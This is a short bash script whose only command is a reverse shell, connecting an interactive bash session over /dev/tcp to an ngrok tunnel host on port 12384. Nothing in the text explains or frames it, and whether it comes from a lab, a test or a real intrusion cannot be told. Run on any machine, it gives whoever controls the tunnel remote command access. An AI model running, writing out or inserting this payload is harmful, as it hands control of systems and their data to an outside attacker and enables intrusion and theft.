#!/bin/bash

bash -i >& /dev/tcp/8.tcp.ngrok.io/12384 0>&1
